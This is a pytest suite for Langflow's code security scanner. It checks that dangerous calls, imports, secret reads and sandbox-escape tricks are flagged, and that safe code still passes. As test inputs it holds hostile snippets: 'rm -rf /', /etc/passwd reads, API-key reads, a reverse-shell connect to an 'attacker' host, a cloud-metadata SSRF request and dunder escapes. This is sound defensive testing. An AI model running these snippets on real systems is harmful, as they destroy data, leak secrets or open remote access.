"""Tests for code security scanning.

Tests cover:
- Safe component code that should pass
- Dangerous function calls (exec, eval, os.system, subprocess, etc.)
- Dangerous imports
- Edge cases (syntax errors, empty code)
"""

import ast
import contextlib
import sys
import tracemalloc

import pytest
from langflow.agentic.helpers.code_security import (
    _STATIC_EVAL_MAX_RESOLVED_CHARS,
    StaticEvaluationBudgetExceededError,
    _static_string_value,
    scan_code_security,
)


class TestScanCodeSecuritySafeCode:
    """Tests that safe component code passes the security scan."""

    def test_should_pass_basic_component(self):
        """Basic Langflow component should pass."""
        code = """
from lfx.custom import Component
from lfx.io import MessageTextInput, Output
from lfx.schema import Data

class MyComponent(Component):
    display_name = "My Component"
    inputs = [MessageTextInput(name="text", display_name="Text")]
    outputs = [Output(name="result", display_name="Result", method="build")]

    def build(self) -> Data:
        return Data(data={"text": self.text})
"""
        result = scan_code_security(code)
        assert result.is_safe is True
        assert result.violations == ()

    def test_should_pass_os_path_usage(self):
        """os.path operations are safe and should pass."""
        code = """
import os
path = os.path.join("a", "b")
exists = os.path.exists(path)
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_pass_http_requests(self):
        """Standard HTTP requests library should pass."""
        code = """
import requests
response = requests.get("https://api.example.com/data")
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_pass_json_operations(self):
        """JSON operations should pass."""
        code = """
import json
data = json.loads('{"key": "value"}')
result = json.dumps(data)
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_pass_math_operations(self):
        """Math operations should pass."""
        code = """
import math
result = math.sqrt(16)
"""
        result = scan_code_security(code)
        assert result.is_safe is True


class TestScanCodeSecurityDangerousCalls:
    """Tests that dangerous function calls are detected."""

    def test_should_detect_exec(self):
        """exec() call should be detected."""
        code = 'exec("print(1)")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("exec()" in v for v in result.violations)

    def test_should_detect_eval(self):
        """eval() call should be detected."""
        code = 'result = eval("1+1")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("eval()" in v for v in result.violations)

    def test_should_detect_compile(self):
        """compile() call should be detected."""
        code = 'code = compile("print(1)", "<string>", "exec")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("compile()" in v for v in result.violations)

    def test_should_detect_dunder_import(self):
        """__import__() call should be detected."""
        code = 'mod = __import__("os")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("__import__()" in v for v in result.violations)

    def test_should_detect_globals(self):
        """globals() call should be detected."""
        code = "g = globals()"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("globals()" in v for v in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import os\nnamespace = locals()\nnamespace['os'].posix_spawn()",
            "import os\nnamespace = vars()\nnamespace['os'].spawnv()",
            "import os\nnamespace_factory = vars\nnamespace = namespace_factory()\nnamespace['os'].fork()",
            "import builtins\nimport os\nnamespace = builtins.vars()\nnamespace['os'].open()",
            "import os\nnamespace = vars(*())\nnamespace['os'].system('id')",
            "import os\nnamespace_factory = vars\nnamespace = namespace_factory(*[])\nnamespace['os'].spawnv()",
            "import os\nnamespace = vars(*(value for value in ()))\nnamespace['os'].fork()",
        ],
    )
    def test_should_detect_runtime_namespace_lookups(self, code):
        assert scan_code_security(code).is_safe is False

    def test_should_allow_single_argument_vars(self):
        assert scan_code_security("class Record:\n    value = 1\ndata = vars(Record())").is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "class Record:\n    value = 1\ndata = vars(*(Record(),))",
            "class Record:\n    value = 1\ndata = vars(*[Record()])",
            "class Record:\n    value = 1\ndata = vars(Record(), *())",
        ],
        ids=["tuple-expansion", "list-expansion", "explicit-with-empty-expansion"],
    )
    def test_should_allow_statically_single_argument_vars(self, code):
        assert scan_code_security(code).is_safe is True

    def test_should_reject_dynamic_starred_vars(self):
        code = "import os\nvalues = ()\nnamespace = vars(*values)\nnamespace['os'].system('id')"
        assert scan_code_security(code).is_safe is False

    def test_should_allow_shadowed_namespace_helpers(self):
        code = "locals = lambda: {}\nvars = lambda: {}\nnamespace = {**locals(), **vars()}"
        assert scan_code_security(code).is_safe is True


class TestScanCodeSecurityDangerousAttrCalls:
    """Tests that dangerous attribute calls (module.method) are detected."""

    def test_should_detect_os_system(self):
        """os.system() should be detected."""
        code = 'import os\nos.system("rm -rf /")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in v for v in result.violations)

    def test_should_detect_os_popen(self):
        """os.popen() should be detected."""
        code = 'import os\nos.popen("ls")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.popen()" in v for v in result.violations)

    def test_should_detect_os_remove(self):
        """os.remove() should be detected."""
        code = 'import os\nos.remove("/tmp/file")'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_subprocess_run(self):
        """subprocess.run() should be detected."""
        code = 'import subprocess\nsubprocess.run(["ls"])'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_subprocess_popen(self):
        """subprocess.Popen() should be detected."""
        code = 'import subprocess\nsubprocess.Popen(["ls"])'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_shutil_rmtree(self):
        """shutil.rmtree() should be detected."""
        code = 'import shutil\nshutil.rmtree("/tmp")'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_sys_exit(self):
        """sys.exit() should be detected."""
        code = "import sys\nsys.exit(1)"
        result = scan_code_security(code)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "name",
        [
            "spawnle",
            "spawnlp",
            "spawnlpe",
            "spawnv",
            "spawnve",
            "spawnvp",
            "spawnvpe",
            "execlpe",
            "fork",
            "forkpty",
            "startfile",
            "open",
            "write",
        ],
    )
    def test_should_detect_remaining_os_process_and_file_io_calls(self, name):
        result = scan_code_security(f"import os\nos.{name}()")
        assert result.is_safe is False
        assert any(f"os.{name}()" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import os as operating_system\noperating_system.spawnv()",
            "from os import spawnve as launch\nlaunch()",
            "from os import *\nspawnvp()",
            "import os\nlauncher = os.spawnv\nlauncher()",
            "import os\nlauncher = getattr(os, 'spawn' + 'v')\nlauncher()",
        ],
    )
    def test_should_detect_remaining_os_calls_through_supported_alias_forms(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "from os.path import os as operating_system\noperating_system.spawnv()",
            "from glob import os as operating_system\noperating_system.execlpe()",
            "import pathlib\npathlib.os.startfile('tool.exe')",
        ],
    )
    def test_should_detect_os_calls_through_module_reexports(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import logging\nlogging.os.system('id')",
            "import logging\nsecret = logging.os.environ",
            "import logging\ngetattr(logging, 'os').spawnv()",
        ],
        ids=["dangerous-call", "dangerous-read", "reflective-access"],
    )
    def test_should_detect_restricted_os_access_through_logging(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import tempfile\ntempfile._os.system('id')",
            "import tempfile\nsecret = tempfile._os.environ",
            "import tempfile\ngetattr(tempfile, '_os').spawnv('id', [], {})",
            "from tempfile import _os\n_os.system('id')",
            "from tempfile import _os as operating_system\noperating_system.execlpe('id')",
            "import tempfile\ntempfile._sys.exit(1)",
            "import tempfile\nmodules = tempfile._sys.modules",
        ],
        ids=[
            "dangerous-call",
            "dangerous-read",
            "reflective-access",
            "from-import",
            "from-import-alias",
            "sys-exit",
            "sys-modules-read",
        ],
    )
    def test_should_detect_restricted_access_through_tempfile_private_reexports(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import tempfile\ntempfile.mkdtemp()",
            "import tempfile\nwith tempfile.NamedTemporaryFile() as handle:\n    handle.write(b'x')",
            "from tempfile import mkdtemp\nmkdtemp()",
        ],
        ids=["mkdtemp", "named-temporary-file", "from-import-safe-member"],
    )
    def test_should_allow_legitimate_tempfile_usage(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "from os import *\ndef write(value):\n    return value\nwrite('ok')",
            "from os import *\nwrite = lambda value: value\nwrite('ok')",
            "from os import *\ndef run(write):\n    return write('ok')",
        ],
    )
    def test_should_allow_locally_shadowed_wildcard_names(self, code):
        assert scan_code_security(code).is_safe is True

    def test_should_detect_wildcard_import_overwriting_local_name(self):
        code = "def write(value):\n    return value\nfrom os import *\nwrite(1, b'x')"
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import asyncio\nasync def run():\n    await asyncio.create_subprocess_exec('id')\n",
                id="asyncio-create-subprocess-exec",
            ),
            pytest.param(
                "import asyncio\nasync def run():\n    await asyncio.create_subprocess_shell('id')\n",
                id="asyncio-create-subprocess-shell",
            ),
            pytest.param(
                "import asyncio\nasync def run():\n    await asyncio.subprocess.create_subprocess_exec('id')\n",
                id="asyncio-subprocess-create-subprocess-exec",
            ),
            pytest.param(
                "import asyncio\nasync def run():\n    await asyncio.subprocess.create_subprocess_shell('id')\n",
                id="asyncio-subprocess-create-subprocess-shell",
            ),
            pytest.param(
                "import asyncio\nasync def run():\n    factory = getattr(asyncio, 'subprocess')\n"
                "    await factory.create_subprocess_exec('id')\n",
                id="computed-asyncio-subprocess-getattr",
            ),
            pytest.param("import os\nos.posix_spawn('/bin/id', ['id'], {})\n", id="os-posix-spawn"),
            pytest.param("import os\nos.posix_spawnp('id', ['id'], {})\n", id="os-posix-spawnp"),
            pytest.param("import posix\nposix.system('id')\n", id="posix-system"),
            pytest.param(
                "import multiprocessing\np = multiprocessing.Process(target=print)\np.start()\n",
                id="multiprocessing-process",
            ),
        ],
    )
    def test_should_detect_reported_process_spawning_bypasses(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False


class TestScanCodeSecurityDangerousImports:
    """Tests that dangerous imports are detected."""

    def test_should_detect_subprocess_import(self):
        """Import subprocess should be detected."""
        code = "import subprocess"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("subprocess" in v for v in result.violations)

    def test_should_detect_shutil_import(self):
        """Import shutil should be detected."""
        code = "import shutil"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_pickle_import(self):
        """Import pickle should be detected."""
        code = "import pickle"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_ctypes_import(self):
        """Import ctypes should be detected."""
        code = "import ctypes"
        result = scan_code_security(code)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import _ctypes",
            "from _ctypes import dlopen",
            "import cffi",
            "from cffi import FFI",
            "import cffi.api",
            "import _cffi_backend",
        ],
        ids=[
            "ctypes-backend",
            "ctypes-backend-from",
            "cffi",
            "cffi-from",
            "cffi-submodule",
            "cffi-backend",
        ],
    )
    def test_should_detect_native_ffi_imports(self, code):
        """Native FFI entry points can load arbitrary shared libraries."""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("forbidden" in violation for violation in result.violations)

    def test_should_detect_from_subprocess_import(self):
        """From subprocess import run should be detected."""
        code = "from subprocess import run"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_restricted_os_import(self):
        """From os import system should be detected."""
        code = "from os import system"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_allow_os_path_import(self):
        """From os import path should be allowed."""
        code = "from os import path"
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_allow_os_import_itself(self):
        """Import os alone should pass (specific functions are blocked)."""
        code = "import os"
        result = scan_code_security(code)
        assert result.is_safe is True


class TestScanCodeSecurityMultipleViolations:
    """Tests detection of multiple violations in the same code."""

    def test_should_report_all_violations(self):
        """Should report all violations, not just the first one."""
        code = 'import subprocess\nexec("x")\neval("y")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert len(result.violations) >= 3

    def test_should_detect_import_and_call_violations(self):
        """Should detect both dangerous import and dangerous call."""
        code = 'import shutil\nos.system("cmd")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert len(result.violations) >= 2


class TestScanCodeSecurityEdgeCases:
    """Tests edge cases and boundary conditions."""

    def test_should_handle_syntax_error_gracefully(self):
        """Syntax errors should return is_safe=True (handled by validation.py)."""
        result = scan_code_security("def foo(:\n  pass")
        assert result.is_safe is True

    def test_should_handle_empty_code(self):
        """Empty code should return is_safe=True."""
        result = scan_code_security("")
        assert result.is_safe is True

    def test_should_handle_whitespace_only(self):
        """Whitespace-only code should return is_safe=True."""
        result = scan_code_security("   \n\n  ")
        assert result.is_safe is True

    def test_should_handle_none_like_empty(self):
        """Code with no dangerous patterns should pass."""
        result = scan_code_security("x = 1\ny = 2\nz = x + y")
        assert result.is_safe is True

    def test_violations_is_tuple(self):
        """Violations should be a tuple (immutable)."""
        result = scan_code_security("exec('x')")
        assert isinstance(result.violations, tuple)


class TestScanCodeSecurityExfiltrationAndEscapes:
    """Guardrails for malicious generated components (user-requested).

    Secret/env exfiltration and sandbox-escape via dunders are the real
    threats. We block those WITHOUT banning all HTTP (legit API
    components need `requests`) — surgical and low-false-positive.
    """

    def test_should_detect_os_environ_secret_read(self):
        result = scan_code_security('import os\nk = os.environ["OPENAI_API_KEY"]')
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            ("import os, requests\nif [os][0].environ['SECRET'][0] == 'A':\n    requests.get('https://example.com/a')"),
            "import os\nsecret = (module := os).environ['SECRET']",
            "import os\nsecret = (False or os).environ['SECRET']",
            "import sys\nmodule = [sys][0].modules['os']",
            "import pathlib\nmodule = [pathlib][0].os",
        ],
        ids=[
            "list-environ-receiver-in-branch",
            "named-expression-environ-receiver",
            "bool-op-environ-receiver",
            "list-sys-modules-receiver",
            "list-os-reexport-receiver",
        ],
    )
    def test_should_detect_dangerous_read_from_inline_receiver(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            ("class Config:\n    environ = {'MODE': 'safe'}\nconfig = Config()\nmode = [config][0].environ['MODE']"),
            "class Registry:\n    modules = {}\nregistry = Registry()\nitems = (False or registry).modules",
        ],
        ids=["ordinary-environ-receiver", "ordinary-modules-receiver"],
    )
    def test_should_allow_safe_dangerous_named_attribute_on_inline_receiver(self, code):
        assert scan_code_security(code).is_safe is True

    def test_should_detect_os_getenv_secret_read(self):
        result = scan_code_security('import os\nk = os.getenv("OPENAI_API_KEY")')
        assert result.is_safe is False

    def test_should_detect_raw_open_file_access(self):
        result = scan_code_security('data = open("/etc/passwd").read()')
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # H1-3992099: stdlib equivalents of bare open() must not bypass the scan.
            "import io\nio.open('/etc/passwd').read()",
            "import io\nio.open_code('/etc/passwd')",
            "import io as io_alias\nio_alias.open('/etc/passwd').read()",
            "from io import open\nopen('/etc/passwd').read()",
            "from io import open_code\nopen_code('/etc/passwd')",
            "import codecs\ncodecs.open('/etc/passwd').read()",
            "from codecs import open\ncodec_open = open\ncodec_open('/etc/passwd')",
            "import io\nopener = getattr(io, 'open')\nopener('/etc/passwd')",
        ],
        ids=[
            "io-open",
            "io-open-code",
            "io-open-aliased-module",
            "from-io-import-open",
            "from-io-import-open-code",
            "codecs-open",
            "from-codecs-import-open",
            "io-open-via-getattr",
        ],
    )
    def test_should_detect_stdlib_open_equivalents(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # H1-3992099: pathlib is the object-oriented raw filesystem API
            # (Path.read_text/write_text/open/...). The whole module is blocked.
            "import pathlib\npathlib.Path('/etc/passwd').read_text()",
            "from pathlib import Path\nPath('/etc/passwd').read_text()",
            "from pathlib import Path\nPath('/tmp/x').write_text('payload')",
            "from pathlib import Path\nPath('/tmp/x').open('r')",
        ],
        ids=[
            "pathlib-module-read-text",
            "pathlib-from-import-read-text",
            "pathlib-write-text",
            "pathlib-open",
        ],
    )
    def test_should_detect_pathlib_file_access(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # io.FileIO is the raw constructor behind open(): it opens the path
            # directly, so blocking only io.open/codecs.open left the same
            # capability reachable. _io is the C module io re-exports from, so
            # io.FileIO *is* _io.FileIO and both spellings must be covered.
            "import io\ndata = io.FileIO('/etc/passwd').read()",
            "import _io\ndata = _io.FileIO('/etc/passwd').read()",
            "from io import FileIO\ndata = FileIO('/etc/passwd').read()",
            "from _io import FileIO\ndata = FileIO('/etc/passwd').read()",
            "from io import FileIO as F\ndata = F('/etc/passwd').read()",
            "from _io import FileIO as F\ndata = F('/etc/passwd').read()",
            "import io as io_alias\ndata = io_alias.FileIO('/etc/passwd').read()",
            "import _io as io_alias\ndata = io_alias.FileIO('/etc/passwd').read()",
            "import io\nctor = io.FileIO\ndata = ctor('/etc/passwd').read()",
            "import io\nio.FileIO('/tmp/payload', 'w').write(b'x')",
            "import io\nio.FileIO('/tmp/payload', 'a').write(b'x')",
            "import io\ndata = io.BufferedReader(io.FileIO('/etc/passwd')).read()",
            "from io import *\ndata = FileIO('/etc/passwd').read()",
            "import _io\n_io.open('/etc/passwd').read()",
            "import _io\n_io.open_code('/etc/passwd')",
        ],
        ids=[
            "io-fileio-read",
            "underscore-io-fileio-read",
            "from-io-import-fileio",
            "from-underscore-io-import-fileio",
            "from-io-import-fileio-aliased",
            "from-underscore-io-import-fileio-aliased",
            "io-fileio-aliased-module",
            "underscore-io-fileio-aliased-module",
            "io-fileio-assigned-constructor",
            "io-fileio-write",
            "io-fileio-append",
            "io-fileio-buffered-wrapper",
            "io-fileio-wildcard-import",
            "underscore-io-open",
            "underscore-io-open-code",
        ],
    )
    def test_should_detect_raw_fileio_constructors(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            # The _io canonicalization must not sweep up the in-memory types.
            "import _io\nbuf = _io.BytesIO(b'x')",
            "import _io\nbuf = _io.StringIO('x')",
            "from _io import BytesIO\nbuf = BytesIO(b'x')",
            "import io\nw = io.TextIOWrapper(io.BytesIO(b'x'))",
            "import io\nassert isinstance(io.BytesIO(b''), io.IOBase)",
            "import codecs\ncodecs.encode('x', 'hex')",
            "import codecs\ncodecs.decode(b'78', 'hex')",
        ],
        ids=[
            "underscore-io-bytesio",
            "underscore-io-stringio",
            "from-underscore-io-import-bytesio",
            "io-textiowrapper-over-memory-buffer",
            "io-iobase-isinstance",
            "codecs-encode",
            "codecs-decode",
        ],
    )
    def test_should_still_allow_in_memory_and_codec_helpers(self, code):
        assert scan_code_security(code).is_safe is True

    def test_io_and_underscore_io_fileio_are_the_same_object(self):
        """The canonicalization rests on a runtime fact; assert it rather than assume it."""
        import _io
        import io

        assert io.FileIO is _io.FileIO
        assert io.open is _io.open

    def test_should_detect_subclasses_sandbox_escape(self):
        result = scan_code_security("evil = ().__class__.__bases__[0].__subclasses__()")
        assert result.is_safe is False

    def test_should_detect_func_globals_escape(self):
        result = scan_code_security("def f():\n    pass\ng = f.__globals__")
        assert result.is_safe is False

    def test_should_detect_builtins_escape(self):
        result = scan_code_security("def f():\n    pass\nb = f.__builtins__")
        assert result.is_safe is False

    # --- no-regression: legitimate patterns must still pass ---

    def test_should_still_allow_http_requests(self):
        # HTTP is a core legit use case — must NOT be banned.
        result = scan_code_security('import requests\nr = requests.get("https://api.example.com")')
        assert result.is_safe is True

    def test_should_still_allow_os_path(self):
        result = scan_code_security('import os\np = os.path.join("a", "b")')
        assert result.is_safe is True

    def test_should_still_allow_getattr(self):
        # getattr is common/legit — banning it would regress real components.
        result = scan_code_security('v = getattr(self, "field", None)')
        assert result.is_safe is True

    def test_should_still_allow_in_memory_io_streams(self):
        # io.StringIO/BytesIO are in-memory and legit; only io.open/open_code are blocked.
        result = scan_code_security("import io\nbuf = io.BytesIO(b'data')\ntext = io.StringIO('x')")
        assert result.is_safe is True

    def test_should_still_allow_codecs_transcoding(self):
        # codecs.encode/decode are legit; only codecs.open is blocked.
        result = scan_code_security("import codecs\ndata = codecs.decode(b'x', 'utf-8')")
        assert result.is_safe is True


class TestScanCodeSecurityNetworkImports:
    """Regression for CVE-2026-33873 incomplete fix (H1-3773010).

    Raw-socket / non-HTTP-protocol / shell-spawning stdlib modules enable the
    same attack class as ``subprocess`` (reverse shells, SSRF, raw exfil) and
    must be blocked. High-level HTTP via ``requests`` stays allowed by design
    (legit API components need it), as do the safe ``urllib.parse`` /
    ``http.HTTPStatus`` siblings.
    """

    def test_should_detect_socket_import(self):
        """Import socket — raw-socket reverse shell / exfil primitive."""
        result = scan_code_security("import socket")
        assert result.is_safe is False
        assert any("socket" in v for v in result.violations)

    def test_should_detect_from_socket_import(self):
        result = scan_code_security("from socket import socket")
        assert result.is_safe is False

    def test_should_detect_socketserver_import(self):
        result = scan_code_security("import socketserver")
        assert result.is_safe is False

    def test_should_detect_urllib_request_import(self):
        """Import urllib.request — SSRF + file:// local read bypass."""
        result = scan_code_security("import urllib.request")
        assert result.is_safe is False
        assert any("urllib.request" in v for v in result.violations)

    def test_should_detect_from_urllib_request_import(self):
        result = scan_code_security("from urllib.request import urlopen")
        assert result.is_safe is False

    def test_should_detect_from_urllib_import_request_submodule(self):
        """`from urllib import request` must also be caught."""
        result = scan_code_security("from urllib import request")
        assert result.is_safe is False

    def test_should_detect_urllib_error_import(self):
        result = scan_code_security("import urllib.error")
        assert result.is_safe is False

    def test_should_detect_http_client_import(self):
        result = scan_code_security("import http.client")
        assert result.is_safe is False

    def test_should_detect_from_http_client_import(self):
        result = scan_code_security("from http.client import HTTPConnection")
        assert result.is_safe is False

    def test_should_detect_from_http_import_client_submodule(self):
        result = scan_code_security("from http import client")
        assert result.is_safe is False

    def test_should_detect_ftplib_import(self):
        result = scan_code_security("import ftplib")
        assert result.is_safe is False

    def test_should_detect_smtplib_import(self):
        result = scan_code_security("import smtplib")
        assert result.is_safe is False

    def test_should_detect_telnetlib_import(self):
        result = scan_code_security("import telnetlib")
        assert result.is_safe is False

    def test_should_detect_poplib_import(self):
        result = scan_code_security("import poplib")
        assert result.is_safe is False

    def test_should_detect_imaplib_import(self):
        result = scan_code_security("import imaplib")
        assert result.is_safe is False

    def test_should_detect_xmlrpc_import(self):
        result = scan_code_security("from xmlrpc import client")
        assert result.is_safe is False

    def test_should_detect_pty_import(self):
        """Import pty — interactive reverse-shell spawning (Scenario D)."""
        result = scan_code_security("import pty")
        assert result.is_safe is False

    def test_should_detect_os_dup2_call(self):
        """os.dup2() — fd redirection used to wire a socket to a shell."""
        result = scan_code_security("import os\nos.dup2(3, 0)")
        assert result.is_safe is False
        assert any("dup2" in v for v in result.violations)

    def test_should_detect_from_os_import_dup2(self):
        result = scan_code_security("from os import dup2")
        assert result.is_safe is False

    # --- reporter PoC payloads (H1-3773010) ---

    def test_should_block_reporter_socket_reverse_shell_poc(self):
        code = "import socket\ns = socket.socket()\ns.connect(('attacker', 4444))"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_block_reporter_urllib_ssrf_poc(self):
        code = "import urllib.request\nurllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"
        result = scan_code_security(code)
        assert result.is_safe is False

    # --- no-regression: HTTP + safe siblings must still pass ---

    def test_should_still_allow_requests(self):
        result = scan_code_security('import requests\nr = requests.get("https://api.example.com")')
        assert result.is_safe is True

    def test_should_allow_urllib_parse(self):
        """urllib.parse (urlencode/quote) is a common, safe API helper."""
        result = scan_code_security("from urllib.parse import urlencode\nq = urlencode({'a': 1})")
        assert result.is_safe is True

    def test_should_allow_urllib_parse_module_import(self):
        result = scan_code_security("import urllib.parse")
        assert result.is_safe is True

    def test_should_allow_http_httpstatus(self):
        """From http import HTTPStatus is legitimate and must not be flagged."""
        result = scan_code_security("from http import HTTPStatus\ns = HTTPStatus.OK")
        assert result.is_safe is True

    def test_should_allow_bare_http_import(self):
        result = scan_code_security("import http")
        assert result.is_safe is True


class TestScanCodeSecurityAliasAndWildcardBypass:
    """Evasion via import aliases / wildcard imports must not slip past.

    ``os``/``sys`` are importable as whole modules (only specific members are
    restricted), so aliasing or wildcard-importing them used to bypass the
    attribute-call / restricted-name checks. The scanner now resolves aliases
    and treats wildcard-imported members as direct attribute access.
    """

    # --- import alias bypass: `import os as o; o.<restricted>()` ---

    def test_should_detect_aliased_os_dup2(self):
        result = scan_code_security("import os as o\no.dup2(3, 0)")
        assert result.is_safe is False
        assert any("dup2" in v for v in result.violations)

    def test_should_detect_aliased_os_system(self):
        result = scan_code_security("import os as o\no.system('id')")
        assert result.is_safe is False

    def test_should_detect_aliased_sys_exit(self):
        result = scan_code_security("import sys as y\ny.exit(1)")
        assert result.is_safe is False

    def test_should_detect_aliased_os_environ_read(self):
        result = scan_code_security("import os as o\nk = o.environ['SECRET']")
        assert result.is_safe is False

    def test_should_detect_aliased_os_getenv(self):
        result = scan_code_security("import os as o\nk = o.getenv('SECRET')")
        assert result.is_safe is False

    def test_should_allow_dotted_import_alias_safe_attribute(self):
        result = scan_code_security("import os.path as path_module\ngetattr(path_module, 'join')('a', 'b')")
        assert result.is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import os.path as path_module\ngetattr(path_module, 'os').getenv('SECRET')",
            "import os.path as path_module\npath_module.os.getenv('SECRET')",
            "import os.path\ngetattr(os.path, 'os').system('id')",
            "import os.path\nos.path.os.system('id')",
            "import os.path\nos.path.os.getenv('SECRET')",
        ],
    )
    def test_should_detect_os_module_escape_through_os_path(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.path.os" in violation for violation in result.violations)

    # --- wildcard import bypass: `from os import *; <restricted>()` ---

    def test_should_detect_wildcard_os_dup2(self):
        result = scan_code_security("from os import *\ndup2(3, 0)")
        assert result.is_safe is False
        assert any("dup2" in v for v in result.violations)

    def test_should_detect_wildcard_os_system(self):
        result = scan_code_security("from os import *\nsystem('id')")
        assert result.is_safe is False

    def test_should_detect_wildcard_os_environ_read(self):
        result = scan_code_security("from os import *\nk = environ['SECRET']")
        assert result.is_safe is False

    # --- no-regression: aliases/wildcards of safe members must still pass ---

    def test_should_allow_aliased_os_path(self):
        result = scan_code_security("import os as o\np = o.path.join('a', 'b')")
        assert result.is_safe is True

    def test_should_allow_aliased_requests(self):
        result = scan_code_security("import requests as r\nr.get('https://api.example.com')")
        assert result.is_safe is True

    def test_should_allow_wildcard_os_safe_member(self):
        """`from os import *` then a non-restricted member (getcwd) is fine."""
        result = scan_code_security("from os import *\nd = getcwd()")
        assert result.is_safe is True


class TestScanCodeSecurityAssignmentAliasBypass:
    """Assignment aliases of imported modules must retain their security policy."""

    def test_should_detect_os_assignment_alias_call(self):
        result = scan_code_security("import os\nmodule = os\nmodule.system('id')")
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_transitive_assignment_alias_call(self):
        result = scan_code_security("import os as imported\nfirst = imported\nsecond = first\nsecond.getenv('SECRET')")
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)

    def test_should_detect_chained_assignment_alias_call(self):
        result = scan_code_security("import os\nfirst = second = os\nsecond.putenv('KEY', 'value')")
        assert result.is_safe is False
        assert any("os.putenv()" in violation for violation in result.violations)

    def test_should_detect_annotated_assignment_alias_read(self):
        result = scan_code_security("import os\nmodule: object = os\nsecret = module.environ['SECRET']")
        assert result.is_safe is False
        assert any("os.environ" in violation for violation in result.violations)

    def test_should_detect_destructured_assignment_alias_call(self):
        result = scan_code_security("import os\n(module,) = (os,)\nmodule.system('id')")
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_starred_destructured_assignment_alias_call(self):
        result = scan_code_security("import os\nmodule, *rest = (os,)\nmodule.system('id')")
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_named_expression_alias_call(self):
        result = scan_code_security("import os\nif module := os:\n    module.system('id')")
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_assignment_alias_dotted_submodule(self):
        result = scan_code_security("import urllib\nmodule = urllib\nmodule.request.urlopen('http://x')")
        assert result.is_safe is False
        assert any("urllib.request" in violation for violation in result.violations)

    def test_should_allow_assignment_alias_of_safe_module(self):
        result = scan_code_security("import requests\nclient = requests\nclient.get('https://api.example.com')")
        assert result.is_safe is True

    def test_should_allow_assignment_of_safe_module_attribute(self):
        result = scan_code_security("import os\npath_module = os.path\npath_module.join('a', 'b')")
        assert result.is_safe is True

    def test_should_allow_alias_rebound_to_safe_value(self):
        code = "import os\nmodule = os\nmodule = object()\nmodule.system('not the os module')"
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_not_leak_safe_local_shadow_into_later_function(self):
        code = """
import os

def safe_function():
    os = object()
    return os

def dangerous_function():
    os.system('id')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_not_leak_local_module_alias_into_outer_scope(self):
        code = """
import os
module = object()

def bind_locally():
    module = os
    return None

module.system('not the os module')
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_allow_parameter_shadowing_module_name(self):
        result = scan_code_security("import os\ndef use_safe_object(os):\n    os.system('not the os module')")
        assert result.is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import os\nfor module in (os,):\n    module.system('id')",
            "import os\nasync def run():\n    async for module in (os,):\n        module.system('id')",
            "import os\n[module.system('id') for module in (os,)]",
            "import os\n{module.system('id') for module in (os,)}",
            "import os\n{module: module.system('id') for module in (os,)}",
            "import os\n(module.system('id') for module in (os,))",
        ],
    )
    def test_should_detect_iterated_module_alias_call(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

